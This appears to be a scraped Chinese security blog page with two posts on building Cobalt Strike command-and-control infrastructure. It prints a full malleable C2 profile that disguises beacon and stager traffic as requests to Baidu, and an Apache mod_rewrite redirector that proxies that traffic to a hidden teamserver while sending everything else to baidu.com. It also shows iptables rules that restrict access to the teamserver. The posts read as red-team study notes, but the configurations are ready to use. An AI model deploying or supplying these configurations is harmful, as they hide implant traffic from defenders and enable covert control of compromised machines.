-<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908161204018.png" alt="image-20200908161204018"></p>
-<p>​        这里有些警告说是header长度过长，这个可以先不用管</p>
-<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908162211661.png" alt="image-20200908162211661"></p>
-<p>​        加载Mallable C2 profile文件开启teamserver后，生成一个shell执行后，执行可以正常上线</p>
-<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908163451703.png" alt="image-20200908163451703"></p>
-<p>​        再用wireshark抓下流量看看，下载stage的流量如下</p>
-<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908163619714.png" alt="image-20200908163619714"></p>
-<p>​        心跳包的数据包如下</p>
-<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908163659565.png" alt="image-20200908163659565"></p>
-<p>​        获取回显的数据包如下</p>
-<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908163806457.png" alt="image-20200908163806457"></p>
-<p>​        好了，配置mallable C2 profile到此为止了，附上最终的profile文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">###Global Options###</span><br><span class="line">set sample_name &quot;baidu.profile&quot;;</span><br><span class="line"></span><br><span class="line">set sleeptime &quot;5000&quot;;  </span><br><span class="line">set jitter    &quot;30&quot;;   </span><br><span class="line">set useragent &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;85.0.4183.83 Safari&#x2F;537.36&quot;; </span><br><span class="line"></span><br><span class="line">###SMB options###    </span><br><span class="line">set pipename &quot;ntsvcs&quot;;</span><br><span class="line">set pipename_stager &quot;ntsvc&quot;;</span><br><span class="line"></span><br><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">    set uri &quot;&#x2F;cache&#x2F;global&#x2F;img&#x2F;aladdinIcon-1.0.gif&quot;;</span><br><span class="line">	client &#123;</span><br><span class="line">        header &quot;Host&quot; &quot;www.baidu.com&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Dest&quot; &quot;image&quot;;</span><br><span class="line">        header &quot;Referer&quot; &quot;https:&#x2F;&#x2F;www.baidu.com&#x2F;&quot;;</span><br><span class="line">        header &quot;Accept-Encoding&quot; &quot;gzip, deflate&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;zh-CN,zh;q&#x3D;0.9&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;Keep-Alive&quot;;</span><br><span class="line">	</span><br><span class="line">        metadata &#123;</span><br><span class="line">            netbios;</span><br><span class="line">	    parameter &quot;sid&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    server &#123;</span><br><span class="line">		header &quot;Accept-Ranges&quot; &quot;bytes&quot;;</span><br><span class="line">		header &quot;Cache-Control&quot; &quot;max-age&#x3D;315360000&quot;;	</span><br><span class="line">		header &quot;Content-Type&quot; &quot;image&#x2F;gif&quot;;</span><br><span class="line">		header &quot;Date&quot; &quot;Tue, 08 Sep 2020 06:29:52 GMT&quot;;</span><br><span class="line">		header &quot;Etag&quot; &quot;216-4c1c6ca3503c0&quot;;</span><br><span class="line">		header &quot;Expires&quot; &quot;216-4c1c6ca3503c0&quot;;</span><br><span class="line">		header &quot;Last-Modified&quot; &quot;Wed, 06 Jun 2012 05:10:47 GMT&quot;;</span><br><span class="line">		header &quot;Server&quot; &quot;Apache&quot;;</span><br><span class="line">		header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">        	netbios;</span><br><span class="line">        	prepend &quot;                 &quot;;</span><br><span class="line">	   		prepend &quot;GIF89a&quot;;</span><br><span class="line">	    	append &quot;;&quot;;</span><br><span class="line">        	print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">http-post &#123;</span><br><span class="line">    set uri &quot;&#x2F;link&quot;;</span><br><span class="line">    set verb &quot;GET&quot;;</span><br><span class="line">    client &#123;</span><br><span class="line">	header &quot;Host&quot; &quot;www.baidu.com&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Mode&quot; &quot;navigate&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Dest&quot; &quot;document&quot;;</span><br><span class="line">        header &quot;Accept-Encoding&quot; &quot;gzip, deflate&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;zh-CN,zh;q&#x3D;0.9&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64url;</span><br><span class="line">	    	parameter &quot;url&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        id &#123;</span><br><span class="line">            base64url;</span><br><span class="line">            parameter &quot;eqid&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">		parameter &quot;wd&quot; &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">	header &quot;Bdpagetype&quot; &quot;3&quot;;</span><br><span class="line">	header &quot;Content-Type&quot; &quot;text&#x2F;html&quot;;	</span><br><span class="line">	header &quot;Server&quot; &quot;BWS&#x2F;1.1&quot;;</span><br><span class="line">	header &quot;Set-Cookie&quot; &quot;BDSVRTM&#x3D;0; path&#x3D;&#x2F;&quot;;</span><br><span class="line">	header &quot;Vary&quot; &quot;Accept-Encoding&quot;;</span><br><span class="line">    header &quot;X-Ua-Compatible&quot; &quot;IE&#x3D;Edge,chrome&#x3D;1&quot;;    </span><br><span class="line">	header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            netbios;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http-stager &#123;</span><br><span class="line"></span><br><span class="line">	set uri_x86 &quot;&#x2F;favicon.ico&quot;;</span><br><span class="line">	set uri_x64 &quot;&#x2F;Favicon.ico&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">	header &quot;Host&quot; &quot;www.baidu.com&quot;;</span><br><span class="line">        header &quot;Referer&quot; &quot;https:&#x2F;&#x2F;www.baidu.com&#x2F;img&#x2F;bd_logo1.png&quot;;</span><br><span class="line">        header &quot;Accept-Encoding&quot; &quot;gzip, deflate&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;zh-CN,zh;q&#x3D;0.9&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	server &#123;</span><br><span class="line">	header &quot;Accept-Ranges&quot; &quot;bytes&quot;;</span><br><span class="line">	header &quot;Content-Type&quot; &quot;image&#x2F;x-icon&quot;;	</span><br><span class="line">	header &quot;Etag&quot; &quot;423e-55c8139094a40&quot;;</span><br><span class="line">	header &quot;Last-Modified:&quot; &quot;Fri, 27 Oct 2017 06:16:01 GMT&quot;;</span><br><span class="line">    	header &quot;Server&quot; &quot;Apache&quot;;</span><br><span class="line">    	header &quot;Vary&quot; &quot;Accept-Encoding,User-Agent&quot;;</span><br><span class="line">    	header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            prepend &quot;                 @@                  (B         (         @                 @&quot;;</span><br><span class="line">            print;</span><br><span class="line">        	&#125; </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stage &#123;</span><br><span class="line">	set userwx &quot;false&quot;;</span><br><span class="line">	set obfuscate &quot;false&quot;;</span><br><span class="line">	set image_size_x86 &quot;305000&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="mod-rewrite对不同流量转发"><a href="#mod-rewrite对不同流量转发" class="headerlink" title="mod_rewrite对不同流量转发"></a>mod_rewrite对不同流量转发</h3><p>​        通过上面的设置，我们已经对我们的流量进行重新设置，那么现在可以根据流量来通过.htaccess来设置流量的转发操作，.htaccess文件内容如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">RewriteEngine On</span><br><span class="line">RewriteCond %&#123;REQUEST_URI&#125; ^&#x2F;(cache&#x2F;global&#x2F;img&#x2F;aladdinIcon-1.0.gif|link|favicon.ico|Favicon.ico)&#x2F;?$</span><br><span class="line">RewriteRule ^.*$ http:&#x2F;&#x2F;teamserver-ip:8880%&#123;REQUEST_URI&#125; [P]</span><br><span class="line">RewriteRule ^.*$ https:&#x2F;&#x2F;www.baidu.com&#x2F;? [L,R&#x3D;302]</span><br><span class="line">&lt;&#x2F;IfModule&gt;</span><br></pre></td></tr></table></figure>
-
-<p>​        配置好以后我们大致进行一下测试。</p>
-<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908171959301.png" alt="image-20200908171959301"></p>
-<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908172017233.png" alt="image-20200908172017233"></p>
-<p>​        应该是没有什么问题，我们回到cobaltstrike，设置一个listener，host设置为前置机对应的<strong>ip</strong>，这里还需要注意前置机的web端口应该和这里的端口一致，否则是不会上线的。</p>
-<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908174336222.png" alt="image-20200908174336222"></p>
-<p>​        成功上线</p>
-<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908174454181.png" alt="image-20200908174454181"></p>
-<p>​        但我们想通过域名来进行上线，但是是无法上线的，因为profile里的域名是百度的域名，我将域名改成自己的域名再进行测试。发现是可以上线的。</p>
-<p>​        因此，<strong>如果我们想用域名上线，并且给域名加上CDN，我们申请的域名必须和我们伪造的域名类似。</strong></p>
-<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908175239355.png" alt="image-20200908175239355"></p>
-<h3 id="设置防火墙"><a href="#设置防火墙" class="headerlink" title="设置防火墙"></a>设置防火墙</h3><p>​        还有最后一个问题解决，我们想要保护自己的teamserver，给我们的监听端口设置规则，只能让我们的重定向服务器访问，其他的都无法访问，该怎么做。</p>
-<p>​        使用iptables进行设置，仅允许特定的ip访问我们teamserver的8880端口</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT  -p tcp --dport 8880 -j DROP</span><br><span class="line">iptables -A INPUT -s xxx.xxx.xxx.xx -p tcp --dport 8880 -j ACCEPT</span><br><span class="line">iptables -L -n --line-number  </span><br><span class="line">iptables-save</span><br></pre></td></tr></table></figure>
-
-<p>​        设置好以后再使用其他的主机去访问我们teamserver的8880端口已经无法访问了。</p>
-<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908193828070.png" alt="image-20200908193828070"></p>
-<p>​        但是我们的beacon还可以正常运行</p>
-<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908194108753.png" alt="image-20200908194108753"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
-    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="藏青">
-      <meta itemprop="description" content="知行合一">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="藏青's BLOG">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">关于Mod_Rewrite重定向cobaltstrike流量的学习总结</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2020-09-04 17:20:35" itemprop="dateCreated datePublished" datetime="2020-09-04T17:20:35+08:00">2020-09-04</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-09-08 11:11:54" itemprop="dateModified" datetime="2020-09-08T11:11:54+08:00">2020-09-08</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/cobaltstrike/" itemprop="url" rel="index">
-                    <span itemprop="name">cobaltstrike</span>
-                  </a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>​        通过使用socat进行重定向虽然可以将我们的teamserver隐藏起来，但是我们如果想做的更好一些，对请求我们重定向主机的流量做一个区分，如果请求来自客户端则重定向到teamserver，如果请求来自其他请求则重定向到其他网站。或者在请求中设置白名单，仅仅允许来自某个特定的ip来访问。这就需要通过apache 的Mod_rewrite来实现。</p>
-<h3 id="mod-rewrite入门"><a href="#mod-rewrite入门" class="headerlink" title="mod_rewrite入门"></a>mod_rewrite入门</h3><p><strong>什么是mod_rewrite？</strong></p>
-<p>​        mod_rewrite是Apache的一个模块，此模块提供了一个基于正则表达式分析器的重写引擎来实时重写URL请求。它支持每个完整规则可以拥有不限数量的子规则以及附加条件规则的灵活而且强大的URL操作机制。此URL操作可以依赖于各种测试，比如服务器变量、环境变量、HTTP头、时间标记，甚至各种格式的用于匹配URL组成部分的查找数据库。 –<a href="https://my.oschina.net/u/2326780/blog/385304" target="_blank" rel="noopener">mod_rewrite模块作用介绍</a></p>
-<p>​         此模块可以操作URL的所有部分(包括路径信息部分)，在服务器级的(httpd.conf)和目录级的(.htaccess)配置都有效，还可以生成最终请求字符串。此重写操作的结果可以是内部子处理，也可以是外部请求的转向，甚至还可以是内部代理处理。<strong>一般mod_rewrite默认是不启动的，这时我们需要手动启用它</strong>  –<a href="https://my.oschina.net/u/2326780/blog/385304" target="_blank" rel="noopener">mod_rewrite模块作用介绍</a></p>
-<p><strong>怎么使用mod_rewrite？</strong></p>
-<p>​        首先安装apache</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install httpd</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200904183349947.png" alt="image-20200904183349947"></p>
-<p>​        安装好以后，查看是否开启mod_rewrite模块,在下面的路径下，我们可以看到我这里默认已经开启了这个模块。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf.modules.d&#x2F;00-base.conf</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907092649577.png" alt="image-20200907092649577"></p>
-<p>​        也可以使用下面的命令检查是否开启,如果能在输出中找到rewrite_module，则说明开启成功</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httpd -M</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907095113772.png" alt="image-20200907095113772"></p>
-<p>​        然后我们需要开启.htaccess的支持，找到/etc/httpd/conf/httpd.conf文件，找到下面的内容，将AllowOverride None 替换为AllowOverride All,注意，这里的<strong>Directory是/var/www/html</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory &quot; &#x2F;var&#x2F;www&#x2F;html&quot;&gt;</span><br><span class="line">....</span><br><span class="line">    AllowOverride None  &#x2F;&#x2F;替换为AllowOverride All</span><br><span class="line">    Require all granted</span><br><span class="line">&lt;&#x2F;Directory&gt;</span><br></pre></td></tr></table></figure>
-
-<p>​        设置好以后启动apache服务,再访问一下看是否开启成功</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service httpd start</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907092757010.png" alt="image-20200907092757010"></p>
-<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907092849077.png" alt="image-20200907092849077"></p>
-<p>​    开启后我们在/var/www/html/下编写一个2.html文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">2.html</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>​        再编写一个.htaccess文件，文件内容如下，我大概先解释一下里面的语法</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">RewriteEngine on   </span><br><span class="line">RewriteRule 1.html 2.html</span><br><span class="line">&lt;&#x2F;IfModule&gt;</span><br></pre></td></tr></table></figure>
-
-<p>​        RewriteEngine on,RewriteEngine 是rewrite功能的总开关，用来开启是否启动url rewrite。</p>
-<p>​        RewriteRule 是指令允许我们基于URL将请求重新映射到Apache。一个<code>.htaccess</code>文件可以容纳多个重写规则，但在运行时，Apache按照定义的顺序应用规则。RewriteRule的语法规则如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RewriteRule Pattern Substitution [Flags]</span><br></pre></td></tr></table></figure>
-
-<p>​        Pattern需要匹配的字符串，Substitution替换为其他的url</p>
-<p>​        编写好以后我们测试一下，访问1.html，实际上这个文件是不存在的，但是经过.htaccess的RewriteRule规则，我们访问到了2.html的内容</p>
-<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907102919483.png" alt="image-20200907102919483"></p>
-<p>​        最后，我们再介绍一个关于mod_rewrite的语法:RewriteCond。</p>
-<p>​        <code>RewriteCond</code>指令允许我们为重写规则添加条件。重写条件包括以下结构：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RewriteRule TestString  Condition  [Flags]</span><br></pre></td></tr></table></figure>
-
-<p>​        TestString:要测试的字符串，Condition：匹配的模式,flag如果是NC则代表忽略大小写的匹配</p>
-<p>​        这样可能不好理解，我们通过一些实例来帮助我们理解,我们再设置一个.htaccess文件，内容如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">RewriteEngine on</span><br><span class="line">RewriteCond &quot;%&#123;HTTP_USER_AGENT&#125;&quot; &quot;test666&quot; [NC]</span><br><span class="line">RewriteRule 1.html 2.html</span><br><span class="line">&lt;&#x2F;IfModule&gt;</span><br></pre></td></tr></table></figure>
-
-<p>​        当我们使用上面的.htaccess后，我们直接通过浏览器去访问1.html文件，会显示文件不存在，也就是说RewriteRule这个规则没有生效。</p>
-<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907103945803.png" alt="image-20200907103945803"></p>
-<p>​        我们尝试抓包将user_agent部分修改为test666，这样就可以正常访问到。也就是说规则生效了。</p>
-<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907104222145.png" alt="image-20200907104222145"></p>
-<p>案例一：根据referer来进行筛选</p>
-<p>​        .htaccess文件内容如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">RewriteEngine on</span><br><span class="line">RewriteCond &quot;%&#123;HTTP_REFERER&#125;&quot; &quot;test666.com&quot; [NC]</span><br><span class="line">RewriteRule 1.html 2.html</span><br><span class="line">&lt;&#x2F;IfModule&gt;</span><br></pre></td></tr></table></figure>
-
-<p>​        直接访问1.html仍然访问不到</p>
-<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907104525076.png" alt="image-20200907104525076"></p>
-<p>​        通过添加referer内容为test666.com则可以正常访问到</p>
-<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907104621874.png" alt="image-20200907104621874"></p>
-<h3 id="mod-rewrite重定向cobaltstrike"><a href="#mod-rewrite重定向cobaltstrike" class="headerlink" title="mod_rewrite重定向cobaltstrike"></a>mod_rewrite重定向cobaltstrike</h3><p>​        根据目标访问的目录不同来进行重定向操作，只有当目标访问到某个特定的地址时，将流量重定向到我们的teamserver，将其他的流量重定向到百度。</p>
-<p>​        我这里cobaltstrike流量这里还是以github上开源的msu_edu.profile的流量来进行配置。我们主要关注下get和post请求部分的url。</p>
